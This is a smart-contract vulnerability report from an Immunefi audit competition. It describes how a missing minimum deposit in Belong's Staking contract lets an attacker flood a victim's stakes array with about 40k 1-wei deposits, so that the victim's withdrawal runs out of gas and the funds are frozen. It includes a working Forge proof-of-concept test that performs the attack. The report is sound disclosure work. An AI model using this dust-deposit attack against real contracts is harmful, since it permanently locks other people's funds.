# 57848 sc medium permanent freezing of funds due to no minimum stake limit

**Submitted on Oct 29th 2025 at 07:49:03 UTC by @KalyanSingh for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57848
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

### Brief / Intro

A user's stakes data is stored in:

```solidity
mapping(address staker => Stake[] times) public stakes;
```

But due to no minimum stake requirement in [\_deposit()](https://github.com/belongnet/checkin-contracts/blob/22d92a3af433a1cf4d0aa758f872c887b2f33db8/contracts/v2/periphery/Staking.sol#L242-L246), an attacker can fill up a target user's array of stakes with dust values. This can result in an OOG (out-of-gas) revert.

## Vulnerability Details

When deployed on an EVM chain with a \~100M gas block limit (e.g., BSC/BNB), an attacker can perform \~40k 1-wei deposits to populate a victim's stakes array. After this, the victim may not be able to withdraw their full amount because withdrawal logic iterates sequentially over the stakes array and can hit OOG.

Assume the following scenario:

{% stepper %}
{% step %}

### Scenario — Step 1

Alice is a DCA staker on BelongNet and stakes tokens daily (Alice could be a large entity or an automated smart contract).
{% endstep %}

{% step %}

### Scenario — Step 2

Bob is a malicious actor who wants to freeze Alice's funds.
{% endstep %}

{% step %}

### Scenario — Step 3

Bob performs \~40k deposit transactions in the staking contract with the recipient set to Alice, which triggers:

```solidity
stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
```

{% endstep %}

{% step %}

### Scenario — Step 4

These \~40k transactions fill Alice's stakes array with \~40k 1-wei entries.
{% endstep %}

{% step %}

### Scenario — Step 5

When Alice tries to withdraw, `_consumeUnlockedSharesOrRevert` parses all stake entries sequentially (see code: <https://github.com/belongnet/checkin-contracts/blob/22d92a3af433a1cf4d0aa758f872c887b2f33db8/contracts/v2/periphery/Staking.sol#L258C14-L287>), which can lead to OOG even with a 100M gas limit.
{% endstep %}
{% endstepper %}

Estimated attacker cost to perform \~40k 1-wei deposits is approximately USD 150–200 (as provided by reporter). After this, Alice's withdrawal transactions will be hit with OOG errors, resulting in stuck funds.

## Impact Details

{% hint style="danger" %}
Alice's withdrawal transactions may revert due to out-of-gas while the contract iterates over a very large stakes array — effectively freezing the victim's funds.
{% endhint %}

## References

This is a classic example of DoS by array traversal.

## Proof of Concept

<details>

<summary>Forge test PoC (expand to view)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Import contracts
import {LONG} from "../contracts/v2/tokens/LONG.sol";
import {Staking} from "../contracts/v2/periphery/Staking.sol";

// Import OpenZeppelin proxy for upgradeable contracts
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

contract StakingSimpleGasTest is Test {
    LONG public long;
    Staking public staking;
    ProxyAdmin public proxyAdmin;
    address public admin;
    address public treasury;
    address public user1;
    address public attacker;

    function setUp() public {
        admin = address(1);
        treasury = address(2);
        user1 = address(3);
        attacker = address(10); // Attacker address like in the original test

        // Deploy proxy admin
        proxyAdmin = new ProxyAdmin(admin);

        // Deploy LONG implementation
        LONG longImpl = new LONG();
        
        // Deploy LONG proxy
        TransparentUpgradeableProxy longProxy = new TransparentUpgradeableProxy(
            address(longImpl),
            address(proxyAdmin),
            abi.encodeWithSelector(LONG.initialize.selector, admin, admin, admin)
        );
        long = LONG(address(longProxy));

        // Deploy Staking implementation
        Staking stakingImpl = new Staking();
        
        // Deploy Staking proxy
        TransparentUpgradeableProxy stakingProxy = new TransparentUpgradeableProxy(
            address(stakingImpl),
            address(proxyAdmin),
            abi.encodeWithSelector(Staking.initialize.selector, admin, treasury, address(long))
        );
        staking = Staking(address(stakingProxy));

        // Set minimum stake period to 1 to allow immediate withdrawal
        vm.prank(admin);
        staking.setMinStakePeriod(1);
    }

    function testStakingGasMeasurement() public {
        // Initial balance setup
        vm.prank(admin);
        long.transfer(user1, 1000 ether);
        vm.prank(admin);
        long.transfer(attacker, 1 ether);

        // User1 stakes a large amount (1000 tokens)
        vm.startPrank(user1);
        long.approve(address(staking), 1000 ether);
        staking.deposit(1000 ether, user1);
        vm.stopPrank();

        console.log("User1 amount staked:", staking.balanceOf(user1));

        // Attacker fills up stakes array with small values to test DOS vector
        vm.startPrank(attacker);
        long.approve(address(staking), 1 ether);
        vm.stopPrank();

        // Create a lot of small stakes to test gas limits during withdrawal
        uint256 stakeCount = 40000; 
        uint256 dustAmount = 1; // 1 wei dust amount

        vm.startPrank(attacker);
        uint256 gasBefore = gasleft();
        for (uint256 i = 0; i < stakeCount; i++) {
            if (i % 10 == 0) {
                console.log("Attacker stake count at:", i);
            }
            staking.deposit(dustAmount, user1); // Attacker deposits to user1's account
        }
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        emit log_named_uint("Gas used for attacker stakes", gasUsed);
        vm.stopPrank();

        console.log("User1 final staked amount:", staking.balanceOf(user1));

        // Advance time to allow withdrawal (min stake period is 1 second)
        vm.warp(block.timestamp + 2);

        // Test the withdrawal gas - this is the main focus of the test
        vm.startPrank(user1);
        gasBefore = gasleft();
        staking.withdraw(staking.balanceOf(user1), user1, user1);
        gasAfter = gasleft();
        gasUsed = gasBefore - gasAfter;
        vm.stopPrank();

        emit log_named_uint("Gas used for withdrawal", gasUsed);

    }
}
```

Notes from reporter:

* Add imports remappings:
  * @openzeppelin/community-contracts/=lib/openzeppelin-community-contracts/contracts/
  * @openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/
  * @openzeppelin/contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/
* You may need to install OpenZeppelin contracts & upgradeable contracts for forge.

Run the test under test/ with:

```
forge test -vvv
```

</details>
